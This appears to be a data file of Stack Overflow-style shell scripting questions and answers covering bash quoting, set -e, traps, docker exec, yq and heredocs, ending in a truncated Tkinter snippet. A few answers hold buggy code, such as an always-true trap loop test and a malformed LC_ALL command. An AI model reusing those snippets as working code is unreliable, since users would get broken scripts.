    "Installing powerline fonts for zsh + Prezto theme": "It is all about the Powerline symbols.\nTo get the Powerline symbols working as mike@Mikes-Laptop.local has:\nDownload a Powerline font. A good font for downloading can be found at https://github.com/powerline/fonts\nInstall it by running ./install.sh.\nChange the font in your Terminal preferences to use the new Powerline font.\nTest! To test the glyphs in a terminal: \necho \"\\ue0b0 \\u00b1 \\ue0a0 \\u27a6 \\u2718 \\u26a1 \\u2699\"\nThe prior instructions were intended for Mac OS version 10.11 with Terminal, but may work similar for other setups.",
    "Keyboard shortcuts broken running interactive Python Console from a script": "Check out readline and rlcompleter:\nimport code\nimport readline\nimport rlcompleter\n\n# do something here\n\nvars = globals()\nvars.update(locals())\nreadline.set_completer(rlcompleter.Completer(vars).complete)\nreadline.parse_and_bind(\"tab: complete\")\nshell = code.InteractiveConsole(vars)\nshell.interact()",
    "set -e exits at i=0;let i++": "the answer to my question is not to use let (or shift, or...) but to use\ni=$((i+1))\nwhen trying to check a bash script by setting 'exit on non-zero status code' with\nset -e\nThe bash manual states that set -e has the effect of 'Exit immediately if a simple command exits with a non-zero status.'.\nUnfortunately let (and shift and ...) return the result of the computation ('If the last arg evaluates to 0, let returns 1; 0 is returned otherwise'). So instead of a status code one gets a return value of some sort. And sometimes this return value will be zero and sometimes one depending on the computation. Therefore set -e will cause the script to exit depending on the result of your computation!!! and there is nothing to do about it unless either you don't use it ever or resort to\nlet i++ || true\nas pointed by arnaud576875 which btw adds extra CPU burden.\nUsing\nlet ++i\nworks only for the specific case that i is not -1, as with let i++ which works only for when i is not 0. Therefore half-solutions.\nI love Unix though, I wouldn't have it any other way.",
    "POSIX sh syntax for for-loops [SC2039]": "I guess the standards-compliant way of doing it would be something like this:\nj=0\nwhile [ $j -le 24 ]; do\n    true > \"$j.json\"\n    j=$(( j + 1 ))\ndone",
    "Get the return code of a C program in my shell program": "You can use \"set -o pipefail\" option.\n[root@myserver Test]# set -o pipefail\n[root@myserver Test]# ./a.out | tail -l\n[root@myserver Test]# echo $?\n100\nHere my program a.out returns 100.\nOr another options is to use pipestatus environment variable. You can read about it here. http://www.linuxnix.com/2011/03/pipestatus-internal-variable.html",
    "How to read Android properties with Java": "",
    "Bash while read loop extremely slow compared to cat, why?": "The reason while read is so slow is that the shell is required to make a system call for every byte. It cannot read a large buffer from the pipe, because the shell must not read more than one line from the input stream and therefore must compare each character against a newline. If you run strace on a while read loop, you can see this behavior. This behavior is desirable, because it makes it possible to reliably do things like:\nwhile read size; do test \"$size\" -gt 0 || break; dd bs=\"$size\" count=1 of=file$(( i++ )); done\nin which the commands inside the loop are reading from the same stream that the shell reads from. If the shell consumed a big chunk of data by reading large buffers, the inner commands would not have access to that data. An unfortunate side-effect is that read is absurdly slow.",
    "Yq: retrieve object keys names": "keys is a built-in function in jq when given an object, returns its keys in an array. So it is not actually apart of your yaml (not a property) which means you cannot do services.keys.\nTo get the keys you can do the following when using Python yq:\nWe will get the object of services in the first part then we pass it to keys which will return a list of keys based on a given object\ncat docker-compose.yml | yq '.services | keys'\nOr like this (without cat and pipe):\nyq '.services | keys' docker-compose.yml\nThe output will be:\n[\n  \"apache\",\n  \"mysql\",\n  \"php\"\n]\nTo get rid of the brackets:\nyq '.services | keys[]' docker-compose.yml\nThe output:\n\"apache\"\n\"mysql\"\n\"php\"\nFor more about details you can check Builtin operators and functions in jq. Note that yq is a wrapper for jq so the documentation of jq would be helpful as the help of yq recommends.\nOn Go yq you can do\nyq e '.services | keys'",
    "How can I paste from the clipboard?": "",
    "passing arguments to docker exec from bash prompt and script": "docker exec -it d886e775dfad sh -c \"mongo --eval 'rs.isMaster()'\"\nThis calls the shell (sh) executing the script in quotation marks. Note that this also fixes things like wildcards (*) which otherwise do not work properly with docker exec.",
    "How to convert a text file containing hexadecimal to binary file using linux commands?": "use xxd -r. it reverts a hexdump to its binary representation.\nsource and source\nEdit: The -p parameter is also very useful. It accepts \"plain\" hexadecimal values, but ignores whitespace and line changes.\nSo, if you have a plain text dump like this:\necho \"0000 4865 6c6c 6f20 776f 726c 6421 0000\" > text_dump\nYou can convert it to binary with:\nxxd -r -p text_dump > binary_dump\nAnd then get useful output with something like:\nxxd binary_dump",
    "How to undo typing (not command output) in iPython shell": "Ctrl-_ (underscore) or Ctrl-x Ctrl-u\nIf you deleted something with ctrl-w/ctrl-k and so on you can just paste it back with ctrl-y.\nSee readline(1) for additional hotkeys.",
    "Variables getting reset after the while read loop that reads from a pipeline [duplicate]": "if you use bash\nwhile read\ndo\n    if [ -f \"$REPLY.bz2\" ]\n    then\n        continue\n    else\n        filcount=$[$filcount+1]\n        bzip $REPLY\n    fi\n    if [ \"$scan\" == \"1\" ]; then bzipint $REPLY\n    fi\n    echo $filcount    #Correct counting\n    echo $zipcount    #Correct counting\n    echo $scacount    #Correct counting\n    echo $valid       #Equal to 1\ndone < <(find $loc -name \"*.bsp\")",
    "What does \"local -a foo\" mean in zsh?": "In local -a, the -a has the same meaning as it does for typeset:\n-a\nThe names refer to array parameters. An array parameter may be created this way, but it may not be assigned to in the typeset statement. When displaying, both normal and associative arrays are shown.",
    "How can a bash script know the directory it is installed in when it is sourced with . operator?": "I believe $(dirname \"$BASH_SOURCE\") will do what you want, as long as the file you are sourcing is not a symlink.\nIf the file you are sourcing may be a symlink, you can do something like the following to get the true directory:\nPRG=\"$BASH_SOURCE\"\nprogname=`basename \"$BASH_SOURCE\"`\n\nwhile [ -h \"$PRG\" ] ; do\n    ls=`ls -ld \"$PRG\"`\n    link=`expr \"$ls\" : '.*-> \\(.*\\)$'`\n    if expr \"$link\" : '/.*' > /dev/null; then\n        PRG=\"$link\"\n    else\n        PRG=`dirname \"$PRG\"`\"/$link\"\n    fi\ndone\n\ndir=$(dirname \"$PRG\")",
    "How to GREP a substring in a line which a is variable assignment?": "You can use the -o (\"only\") flag. This command:\ngrep -o 'CpuIowait=[^;]*'\nwill print out the specific substrings that match CpuIowait=[^;]*, instead of printing out the whole lines that contain them.",
    "<back space> not functional in python and ipython in shell": "According to https://blog.csdn.net/qq_29695701/article/details/90715653\nI added\nexport TERMINFO=/usr/share/terminfo\nto my .bashrc file and it worked!\nFor csh or tcsh, do this instead\nsetenv TERMINFO /usr/share/terminfo",
    "How do you take a suffix of a string in bash using negative offsets?": "Because :- is parameter expansion syntax to \"Use default values\".\nFrom the documentation:\nWhen not performing substring expansion, using the form described below (e.g., \u2018:-\u2019), Bash tests for a parameter that is unset or null.\nSo by doing ${STRING:-4} you are actually asking bash to expand STRING and if it is unset (have never been assigned before) or null (a null string, printed as '') it will substitute the expansion with 4. In your example, STRING is set and thus it is expanded to its value.\nAs another answer states, you need to scape the expression to not trigger the default value behavior, the manual specifies it:\nNote that a negative offset must be separated from the colon by at least one space to avoid being confused with the :- expansion.\nFor example:\n${STRING:(-4)}\n${STRING: -4}",
    "Signal handling in a shell script": "You need to use trap to catch signals:\nTo just ignore SIGINT use:\ntrap '' 2\nif you want to specify some special action for this you can make it that in line:\ntrap 'some commands here' 2\nor better wrap it into a function\nfunction do_for_sigint() {\n ...\n}\n\ntrap 'do_for_sigint' 2\nand if you wish to allow your script to finish all it's tasks first:\nkeep_running=\"yes\"\n\ntrap 'keep_running=\"no\"' 2\n\nwhile [ $keep_running==\"yes\" ]; do\n # main body of your script here\ndone",
    "How can i delete an element in an array and then shift the array in Shell Script?": "Try this:\n$ array=( \"one two\" \"three four\" \"five six\" )\n$ unset array[1]\n$ array=( \"${array[@]}\" )\n$ echo ${array[0]}\none two\n$ echo ${array[1]}\nfive six\nShell arrays aren't really intended as data structures that you can add and remove items from (they are mainly intended to provide a second level of quoting for situations like\narr=( \"one two\" \"three four\" )\nsomecommand \"${arr[@]}\"\nto provide somecommand with two, not four, arguments). But this should work in most situations.",
    "Running a Python script within shell script - Check status": "First, you can pass the desired exit code as an argument to sys.exit in your python script.\nSecond, the exit code of the most recently exited process can be found in the bash parameter $?. However, you may not need to check it explicitly:\nif python script.py; then\n    echo \"Exit code of 0, success\"\nelse\n    echo \"Exit code of $?, failure\"\nfi\nTo check the exit code explicitly, you need to supply a conditional expression to the if statement:\npython script.py\nif [[ $? = 0 ]]; then\n    echo \"success\"\nelse\n    echo \"failure: $?\"\nfi",
    "vim errors on vim startup when run in fish shell": "The problem is caused by the use of the fish shell as the default shell (set in my .tmux.conf). To solve the problem, add this to the top of your .vimrc file:\nset shell=/bin/sh \nThis post helped me sort things out:\nDebian Bug report logs - #609599 vim-runtime: Error detected while processing ruby.vim.\nAlso thanks to commenters @MichaelSchuller and @romainl.",
    "Iterating through mount points using Python": "The Python and cross-platform way:\npip install psutil  # or add it to your setup.py's install_requires\nAnd then:\nimport psutil\npartitions = psutil.disk_partitions()\n\nfor p in partitions:\n    print(p.mountpoint, psutil.disk_usage(p.mountpoint).percent)",
    "[-d: command not found [closed]": "[-d\nis not a command.\n[ -d\nis the test command with the -d option.\nSpace matters.\n(Also, the [ command needs to end with a ] parameter, which likewise has to be separated from other arguments by whitespace.)\nThat's the crux of the matter. There is another issue, though: If you quote the tilde, it doesn't expand. (This is one of the rare place where you may want to avoid quotes.) Quotes are great, though, so why not write \"$HOME/.ssl\"? (There's a subtle difference between ~ and \"$HOME\", but it doesn't matter for most uses.)\nHonestly, all you really need is probably:\nif mkdir -p ~/.ssl; then\n  # Do stuff with new directory\nelse\n  # Handle failure (but keep in mind `mkdir` will have its own error output)\nfi",
    "what is If [[-n variable ]] syntax used for in bash": "help test would tell you:\nString operators:\n\n  ....\n\n  -n STRING\n     STRING      True if string is not empty.",
    "Mongodb shell mongo: Only one usage of each socket address (protocol/network address/port) is normally permitted. for socket: 0.0.0.0:27017": "In the command prompt type the following command\nnetstat -a -n -o | find \"27017\"\nThis will list all processes which are using port \"27017\" along with the PID.\nLocate the PID using \"27017\". For example if the PID is 10580, to kill it\ntaskkill /f /pid 10580\nNow start mongo. Hope this helps.",
    "How to run a Python script portably without specifying its full path": "If the directory containing run.py is on the module search path (for example, PYTHONPATH environment variable), you should be able to run it like this:\npython -m run\nHere is the documentation on the -m command line option:\n-m module-name\nSearches sys.path for the named module and runs the corresponding .py file as a script.",
    "shell script purpose of x in \"x$VARIABLE\" [duplicate]": "It's a trick to ensure you don't get an empty string in the substitution if one of the variables is empty. By putting x on both sides it's the same as just comparing the variables directly but the two sides will always be non-empty.\nIt's an old kludge which made more sense when scripts were written as:\nif [ x$USER != x$RUN_AS_USER ]\nThere if you just had $USER and it were empty then you could end up with\nif [  != root ]   # Syntax error\nWith the x you get this, which is better:\nif [ x != xroot ]\nHowever, when the variables are quoted the x is unnecessary since an empty string in quotes isn't removed entirely. It still shows up as a token. Thus\nif [ \"$USER\" != \"$RUN_AS_USER\" ]   # Best\nis the best way to write this. In the worst case with both variables empty you'd get this which is a valid statement:\nif [ \"\" != \"\" ]",
    "Why cannot I define an empty function in shell?": "The bash shell's grammar simply doesn't allow empty functions. A function's grammar is:\n  name () compound-command [redirection]\n  function name [()] compound-command [redirection]\nAnd in a compound command of the form:\n{ list; }\nlist can't be empty. The closest you can get is to use a null statement or return:\nfunction empty_func() {\n    : \n}\nor\nfunction empty_func() {\n    return\n}",
    "Opposite of Linux Split": "The magic command would be:\ncat output_* > output.all\nThere is no need to sort the file names as the shell already does it (*).\nAs its name suggests, cat original design was precisely to conCATenate files which is basically the opposite of split.\n(*) Edit:\nShould you use an (hypothetical ?) locale that use a collating order where the a-z order is not abcdefghijklmnopqrstuvwxyz, here is one way to overcome the issue:\nLC_ALL=C \"sh -c cat output_* > output.all\"",
    "How to create a dynamic variable and assign value to it?": "You can use bash's declare directive and indirection feature like this:\np_val=\"foo\"\nactive_id=$p_val\ndeclare \"flag_$active_id\"=\"100\"\nTESTING:\n> set | grep flag\nflag_foo=100\nUPDATE:\np_val=\"foo\"\nactive_id=\"$p_val\"\nv=\"flag_$active_id\"\ndeclare \"$v\"=\"100\"\n\n> echo \"$v\"\nflag_foo\n> echo \"${!v}\"\n100\nUsage in if condition:\nif [ \"${!v}\" -ne 100 ]; then\n   echo \"yes\"\nelse\n   echo \"no\"\nfi\n\n# prints no",
    "Extract version number from a string": "Following Kent's answers, this can work:\ngrep -Po '(?<=divider-bin-)\\d.\\d.\\d'\nand even better:\ngrep -Po '(?<=divider-bin-)[^;]+'\nit greps from divider-bin- until it find the ; character. This way any NNN.NNN. ... . NNN format will work (no matter how many blocks of NN).\nTest:\n$ echo \"data-c(kuh-small1);divider-bin-1.4.4;divider-conf-1.3.3-w(1,16);storage-bin-1.5.4;storage-conf-1.5.0-w(1);worker-bin-4.5.1;worker-conf-4.4.1-c(kuh)-win2\" | grep -Po '(?<=divider-bin-)[^;]+'\n1.4.4\n$ echo \"data-c(kuh-small1);divider-bin-1.4;divider-conf-1.3.3-w(1,16);storage-bin-1.5.4;storage-conf-1.5.0-w(1);worker-bin-4.5.1;worker-conf-4.4.1-c(kuh)-win2\" | grep -Po '(?<=divider-bin-)[^;]+'\n1.4",
    "How do I find the current virtual terminal": "Check if 'fgconsole' does what you need. Seems to work for me (eg, returns 7 and I'm currently in X)",
    "Interpolating variables which contain '$' in a bash script": "Use single quotes when you assign to $PASS. Double quotes won't recursively expand variables.\nObserve:\n$ foo=hello\n$ bar=world\n$ single='$foo$bar'\n$ double=\"$foo$bar\"\n$ echo \"$single\"\n$foo$bar\n$ echo \"$double\"\nhelloworld\nQuotes only affect how the shell parses a literal string. The only time the shell looks \"inside\" a variable is when you don't use any quotes at all, and even then it only does word-splitting and wildcard expansion.",
    "Unix Bash Shell Programming if directory exists": "Try:\nif [ -d ~/tmp/\"$sd\" ]; then\nor:\nif [ -d \"$HOME/tmp/$sd\" ]; then\nQuoting prevents expansion of ~ into your home directory.",
    "ANSI questions: \"\\x1B[?25h\" and \"\\x1BE\"": "These are ANSI escape sequences (also known as VT100 codes) are an early standardisation of control codes pre-dating ASCII.\nThe escape sequence \\x1BE, or Esc+E, is NEL or \"Next line\", and is used on older terminals and mainframes to denote CR+LF, or \\r\\n.\nThe escape sequence \\x1B[ (Esc+[) is an example of a Control Sequence Introducer. (\\x9B is another single-character CSI.) The control sequence ?25h following it is used to show the cursor.\nMost terminals will support these control codes; to enter escape sequences you can type Ctrl+V, Ctrl+[ which should render as ^[ (the C0 code for ESC), followed by the escape code.\nReferences:\nANSI escape code\nC0 and C1 control codes",
    "Set alias with quotes and double quotes in command [duplicate]": "A simple solution is to create a function, instead of an alias:\nfunction function_name() {\n\n    expect -c 'spawn ssh usr@ip -p 57022 ; \\\n        expect password ; send \"pass\\n\" ; interact'\n\n}\nSo you can call function_name, and it will work just as fine as with an alias.\nIf you still want to use an alias, just escape the inner \"'s:\nalias alias_name=\"expect -c 'spawn ssh usr@ip -p 57022 ; expect password ; send \\\"pass\\n\\\" ; interact'\"\nand it should work.",
    "pipe each line of a file to a command": "Use base64 --decode together with a loop:\n$ while IFS= read -r line; do echo \"$line\" | base64 --decode; done < file\ncat\ndog\nhouse",
    "Execute shell script everytime a new user is created": "From man adduser:\n   If  the  file  /usr/local/sbin/adduser.local exists, it will be exe\u2010\n   cuted after the user account has been set up  in  order  to  do  any\n   local setup.  The arguments passed to adduser.local are:\n   username uid gid home-directory\nLooks like you can add your user-creation actions here.",
    "Using output of previous commands in bash": "Since the amount of output is indeterminate, it doesn't make sense for bash to store it for you for re-display. But there's an alternate solution to your problem:\nThe tee command allows you to duplicate an output stream to a file. So if you're willing to use a file for temporary storage, you can do something like this:\nmake | tee output.txt\ngrep \"warning\" output.txt\nThis solution avoids running make twice, which could be (a) expensive and (b) inconsistent: the second make may be doing less work than the first because some targets were already made the first time around.\nNote: I haven't tried this. You may need to fiddle with joining the error and output streams, or such.",
    "Equivalent of \"du\" command on a Amazon S3 bucket": "",
    "missing end to balance this if statement": "Although the linked repository contains a script for fish, the README does not provide any directions for how to use that script. Not having used fish in several years, I think what you want to do is add\nif status --is-login\n  source (brew --prefix)\"/opt/bash-git-prompt/share/gitprompt.fish\"\nend\nto ~/.config/fish/config.fish instead. The if status command prevents the file from being unnecessarily sourced if you aren't starting an interactive shell.",
    "How to (not) pass empty quoted variables as arguments to commands": "You can actually solve this cleanly with the \"use alternate value\" option (:+) in a parameter expansion:\ncurl -o - ${PARAMS:+\"--data\" \"$PARAMS\"} \"${URL}\"\nIf PARAMS is empty or undefined, the whole ${PARAMS:+\"--data\" \"$PARAMS\"} thing evaluates to the empty string, and since it's not double-quoted, word splitting removes it entirely. On the other hand, if PARAMS is nonblank, it gets effectively replaced by \"--data\" \"$PARAMS\", which is exactly what you want.\n[EDIT] This will work in most POSIX-ish shells, but not zsh, since zsh doesn't word-split expansions even if they're unquoted. If you want this to work in zsh (as well as bash, dash, ksh, etc) you need to make the option label a separate conditional item:\ncurl -o - ${PARAMS:+\"--data\"} ${PARAMS:+\"$PARAMS\"} \"${URL}\"",
    "Deleting last line of a file": "sed -ie '$d' filename.txt\nThe i option tells sed to edit the file in place.",
    "How to preserve double quotes in $@ in a shell script?": "First, you probably want quoted version of $@, i.e. \"$@\". To feel the difference, try putting more than one space inside the string.\nSecond, quotes are element of shell's syntax -- it doesn't do you a favor. To preserve them, you need to escape them. Examples:\nfoo 1 \"\\\"this arg has whitespace\\\"\" 3\n\nfoo 1 '\"this arg has whitespace\"' 3",
    "Rscript detect if R script is being called/sourced from another script": "",
    "How to run console command in yii2 from web": "",
    "Bash script to install AWS CLI tools": "",
    "How to separate multiple commands passed to eval in bash": "\\n is not a newline; it's an escape sequence that in some situations will be translated into a newline, but you haven't used it in one of those situations. The variable $z doesn't wind up containing a newline, just backslash followed by \"n\". As a result, this is what's actually being executed:\n$ echo a\\necho b\nanecho b\nYou can either use a semicolon instead (which requires no translation), or use \\n in a context where it will be translated into a newline:\n$ newline=$'\\n'\n$ x='echo a'\n$ y='echo b'\n$ z=\"$x$newline$y\"\n$ eval \"$z\"\na\nb\nNote the double-quotes around \"$z\" -- they're actually critical here. Without them, bash will word-split the value of $z, turning all whitespace (spaces, tabs, newlines) into word breaks. If that happens, eval will receive the words \"echo\" \"a\" \"echo\" b\", effectively turning the newline into a space:\n$ eval $z\na echo b\nThis is yet another in the long list of cases where it's important to double-quote variable references.",
    "ANSI escape codes for coloring inside bash printf": "You're looking for a format specifier that will expand escape characters in the argument. Conveniently, bash supports (from help printf):\n%b        expand backslash escape sequences in the corresponding argument\nAlternatively, bash also supports a special mechanism by which will perform expansion of escape characters:\nd=$'\\e[33m'",
    "What do the suffixes \"+\" and \"-\" after the job id of background jobs mean?": "It's in the man-page for jobs under STDOUT:\n> man jobs\nThe character '+' identifies the job that would be used as a default for the fg or bg utilities; this job can also be specified using the job_id %+ or \"%%\" . The character '-' identifies the job that would become the default if the current default job were to exit; this job can also be specified using the job_id %-.\nSo the job marked with '+' is the one that will be activated by 'fg'.",
    "How to select a different type of command shell in the Visual Studio Code integrated terminal?": "No need to keep changing your default terminal setting. Install the Shell Launcher extension, configure it, and then ctrl-shift-t to select which terminal you want to open inside of VS Code.",
    "How to run a subcommand inside find exec": "This is what you are looking for:\nfind . -name \"*.csv\" -exec sh -c 'echo $(basename \"$1\")' sh {}  \\;",
    "Svn diff to output all lines from files": "Yes, you can use external diff to accomplish this. I usually do it by command like this:\nsvn diff --diff-cmd diff -x \"-U30\" \nHere, -U30 is unified context size. You should make it big enough to include all lines from file. For example, if your longest file has 1000 lines, you'd use -U1000.",
    "Extracting part of a string on jenkins pipeline": "",
    "What is Fish equivalent for <<EOF in Bash": "Thanks to the link provided by Etan I found out that such feature is not implemented, and the closest thing available is\n> echo \"\\\n  foo\n  \" | nc localhost 8888",
    "How do I use quotes in cmd start?": "Reference Start - Start a program, command or batch script (opens in a new window.)\nSyntax\nSTART \"title\" [/D path] [options] \"command\" [parameters]\nKey:\ntitle Text for the CMD window title bar (required.)\npath Starting directory.\ncommand The command, batch file or executable program to run.\nparameters The parameters passed to the command.\n...\nAlways include a TITLE this can be a simple string like \"My Script\" or just a pair of empty quotes \"\". According to the Microsoft documentation, the title is optional, but you may will have problems if it is omitted.\nThe reason you have an error if title is omitted is because the first \" character (if present) will be used to delimit the title, so start will interpret \"Program Files\" as a title.\nIf there are no \" characters then title can be omitted.\nYour command should look like:\nstart /wait \"My title\" \"c:\\Program Files\\NetDrive2\\nd2cmd.exe\" -c m -t ftp -blabla",
    "In place untar and delete tar (or tar.gz)": "for file in *.tar.gz; do tar xzvf \"${file}\" && rm \"${file}\"; done\nDon't forget to quote your variables to account for funky filenames with whitespace.",
    "How to assign results from printf statement to a variable (for leading zeroes)?": "The let command forces arithmetic evaluation, and the referenced \"variable\" does not exist, so you get the default value 0.\ny=5\nx=y; echo $x        # prints: y\nlet x=y; echo $x    # prints: 5\nDo this instead:\nframenr=$(( 1 + (y * cols * resolutions) + (x * resolutions) + res ))\necho $framenr:\n\n# or\nframename=$(printf 'frame_%03d' $framenr)\n\necho $framename\nAnd there's printf -v to avoid subshell invocation:\n# with bash 3.1+\nprintf -v framename 'frame_%03d' $framenr\nSee the manual for printf -v, available from bash 3.1+.\nI recall reading somewhere that $[ ] is deprecated. Use $(( )) instead.",
    "Can I align variables in a string with echo and bash?": "Use printf:\nprintf \"\\rFileName : %20s : %8d of %8d Completed\" $filename $index $lines",
    "Elixir - call a module function from the shell": "You can use mix run with the -e argument for this:\n$ mix run -e MyApp.Helper.start\nor if you have arguments to pass to the function:\n$ mix run -e \"MyApp.Helper.start(:foo, :bar)\"\nFrom mix help run:\nIf there is a desire to execute a script within the current application or configure the application via command line flags, it is possible to do so by passing a script file or an eval expression to the command:\nmix run my_app_script.exs arg1 arg2 arg3\nmix run -e \"MyApp.start\" -- arg1 arg2 arg3",
    "Heredoc on docker exec": "Remove -t option from docker exec command to remove attached pseudo-TTY OR use --tty=false:\ndocker exec -i mycontainer ./manage shell <<-EOF\n    # shell commands to be executed\nEOF\nOr else:\ndocker exec -i --tty=false mycontainer ./manage shell <<-EOF\n    # shell commands to be executed\nEOF",
    "What is EOF!! in the bash script?": "On the command line, !! would be expanded to the last command executed. Bash will print the line for you:\n$ ls\na.txt  b.txt\n$ cat <<EOF!!\ncat <<EOFls\n>\nIn a script, though, history expansion is disabled by default, so the exclamation marks are part of the word.\n#! /bin/bash\nls\ncat <<EOF!!\necho 1\nEOFls\necho 2\nProduces:\na.txt  b.txt\nscript.sh: line 7: warning: here-document at line 3 delimited by end-of-file (wanted `EOF!!')\necho 1\nEOFls\necho 2\nTo enable history and history expansion in a script, add the following lines:\nset -o history\nset -H",
    "How do I know whether bash kill will use a pid or a jobspec?": "with kill 1 you will send a signal to process with pid 1. To kill job 1 you have to type\n  kill %1\nthe jobspec is %",
    "Script with lsof works well on shell not on cron": "from your working cmd-line, do\nwhich lsof\nwhich grep\nwhich wc\nwhich date\nTake the full paths for each of these commands and add them into your shell script, producing something like\n/bin/echo \"Timestamp: `/bin/date +\"%m-%d-%y %T\"` Files: `/usr/sbin/lsof | /bin/grep app | /bin/wc -l`\"\nOR you can set a PATH var to include the missing values in your script, i.e.\n PATH=/usr/sbin:${PATH}\nAlso unless you expect your script to be run from a true Bourne Shell environment, join the early 90's and use the form $( cmd ... ) for cmd-substitution, rather than backticks. The Ksh 93 book, published in 1995 remarks that backticks for command substitution are deprecated ;-)\nIHTH",
    "What will happen when I edit a script while it's running?": "Let's test it.\nCreate a script test.sh:\n#!/usr/bin/env bash\n\nsleep 1\necho 'echo \"executed overwritten\"' >> \"$0\"   # append to self\nsleep 1\necho 'executed original'\nand execute it:\n$ bash --version\nGNU bash, version 4.2.24(1)-release (i686-pc-linux-gnu)\nCopyright (C) 2011 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n\nThis is free software; you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n$ chmod +x test.sh \n$ ./test.sh \nexecuted original\nexecuted overwritten\n$ \nNotice that bash continued reading the modified file. It maintains its current position in the file (in bytes) when the file changes.\nAs a demonstration, the script\n#!/usr/bin/env bash\n\nsleep 1\ndd if=/dev/urandom bs=1024 count=1 of=\"$0\" &>/dev/null   # overwrite self\nsleep 1\necho 'executed original'\ngives the output\n$ ./test.sh \n./test.sh: line 6: syntax error near unexpected token `$'\\311\\262\\203''\n./test.sh: line 6: `\ufffd\ufffdz\ufffde\u043f9)\ufffdv\ufffd\ufffd\u2592y\ufffda\ufffd\ufffd44'{\ufffdd\ufffd\ufffd4\\:\ufffdA\ufffd\ufffd\ufffd\ufffd\u02f7\ufffd\ufffd\ufffd&\ufffd$\ufffd\ufffd\ufffd\ufffd\ufffdl\ufffd\n@(\u0272\ufffd\ufffd4\ufffd\ufffdO\u03f9I\ufffdn>\ufffd\ufffd7\ufffd\ufffdP\ufffdM\ufffda\ufffd\ufffdX.\ufffdS\ufffda\ufffd\ufffd\ufffdV\ufffdm\ufffd~O<\ufffd\ufffd{}\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdJ\ufffd\ufffd$\ufffd\ufffdTOtRd\ufffd\ufffdNw\ufffd&\ufffd\ufffdB\ufffdDz\ufffd\u2592\ufffd\ufffd-\ufffd\ufffd<`\ufffdP<?N\ufffd\ufffd\u2592rT\ufffdJq\ufffdL\ufffd\ufffd\ufffd\ufffdJY\ufffd*hz\ufffd\ufffd\ufffdM\ufffd\ufffd\ufffd\ufffd\ufffdi\ufffd\u2ae3\ufffd\ufffdS+\ufffd\ufffd\ufffd\ufffd\ufffd\\\ufffd\ufffdc\ufffd\ufffd\ufffdm\ufffdNKV\ufffd8|\ufffd\ufffdxvX}\ufffd\u05c9V\ufffd\ufffd\ufffd\ufffdPTd\u4284\ufffd9\ufffd\ufffd7\ufffd\ufffd\ufffd|\ufffd\ufffd/\ufffd\ufffdX\ufffd\ufffd\n                                                                                                       \ufffd\ufffd0\u00a4k\ufffd\ufffd_\ufffdR\ufffd\ufffd\ufffde\ufffd*\ufffd\ufffd\ufffd(qu:UU\u026dp/j\ufffd\ufffdn\ufffd\ufffdb\u0147_\ufffdUR?3\u2592\ufffd\u2592\ufffd%Rn\ufffd|DE$8\ufffdQbaK)A\ufffd{ \ufffd\ufffdO>9\ufffd\ufffdA\ufffd\ufffd\ufffd\ufffd\ufffdlt\ufffd\ufffd\ufffd\ufffd\ufffdg)s\ufffd\ufffdO\ufffd\ufffdM\ufffd\ufffd@\ufffd\ufffd\ufffdw\ufffd\ufffd|\ufffd\ufffd\ufffd\ufffd\ufffdN\ufffd\ufffd,W'\nNotice that it attempted to execute the random gibberish.\n(This is Ubuntu 12.04. Behavior may vary with other shells.)",
    "Windows Kiosk App": "You should check out Microsoft Steady State\nIt has plenty features and are free to use.\nWindows SteadyState Features\nWhether you manage computers in a school computer lab or an Internet cafe, a library, or even in your home, Windows SteadyState helps make it easy for you to keep your computers running the way you want them to, no matter who uses them.\nWindows Disk Protection \u2013\nHelp protect the Windows partition, which contains the Windows operating system and other programs, from being modified without administrator approval.Windows SteadyState allows you to set Windows Disk Protection to remove all changes upon restart, to remove changes at a certain date and time, or to not remove changes at all. If you choose to use Windows Disk Protection to remove changes, any changes made by shared users when they are logged on to the computer are removed when the computer is restarted\nUser Restrictions and Settings \u2013\nThe user restrictions and settings can help to enhance and simplify the user experience. Restrict user access to programs, settings, Start menu items, and options in Windows. You can also lock shared user accounts to prevent changes from being retained from one session to the next.\nUser Account Manager \u2013\nCreate and delete user accounts. You can use Windows SteadyState to create user accounts on alternative drives that will retain user data and settings even when Windows Disk Protection is turned on. You can also import and export user settings from one computer to another\u2014saving valuable time and resources.\nComputer Restrictions \u2013\nControl security settings, privacy settings, and more, such as preventing users from creating and storing folders in drive C and from opening Microsoft Office documents from Internet Explorer\u00ae.\nSchedule Software Updates \u2013\nUpdate your shared computer with the latest software and security updates when it is convenient for you and your shared users.\nDownload: http://www.microsoft.com/downloads/details.aspx?displaylang=en&FamilyID=d077a52d-93e9-4b02-bd95-9d770ccdb431",
    "how to make $(eval $(shell ...)) work in GNU make": "This will probably do for what you have in mind:\nmakefile_fragment:\n  program-that-emits-makefile-fragment > $@\n\ninclude makefile_fragment\nIs that enough? There are additional tricks you can use if you need them, such as having the rule add context around what the program produces, or piping the output through sed to glom it into one line, then parsing it out with backslashes.",
    "How can I create a small IDLE-like Python Shell in Tkinter?": "Simple Python Shell / Terminal / Command-Prompt\n********************* It's literally just a \"type input, show output\" thing. ************************\nimport os\nfrom tkinter import *\nfrom subprocess import *\n\n\nclass PythonShell:\n\n    def __init__(self):\n        self.master = Tk()\n\n        self.mem_cache = open(\"idle.txt\", \"w+\")\n        self.body = None\n        self.entry = None\n        self.button = None\n        self.entry_content = None\n\n    @staticmethod\n    def welcome_note():\n        \"\"\"\n        To show welcome note on tkinter window\n        :return:\n        \"\"\"\n        Label(text=\"Welcome To My Python Program [Version 1.0]\", font='Arial 12', background=\"#272626\",\n              foreground=\"white\").pack()\n\n        Label(text=\">> Insert Python Commands <<\", font='Arial 12', background=\"#272626\",\n              foreground=\"white\").pack()\n\n    def get_text(self):\n        \"\"\"\n        This method will perform following operations;\n        1- Get text from body\n        2- Implies python compilation (treat text as command)\n        3- Set Output in Output-Entry\n\n        :return: get and set text in body of text box\n        \"\"\"\n        content = self.body.get(1.0, \"end-1c\")\n        out_put = self.run_commands(content)\n        self.entry_content.set(out_put)\n\n    def store_commands(self, command=None):\n\n        try:\n            self.mem_cache.write(command + ';')\n            self.mem_cache.close()\n\n        except Exception as e:\n            print(e)\n\n    def get_stored_commands(self):\n        try:\n            with open(\"idle.txt\", \"r\") as self.mem_cache:\n                self.mem_cache.seek(0)\n                val = self.mem_cache.read()\n                self.mem_cache.close()\n                return val\n\n        except Exception as e:\n            print(e)\n\n    @staticmethod\n    def check_if_file_empty():\n        size = 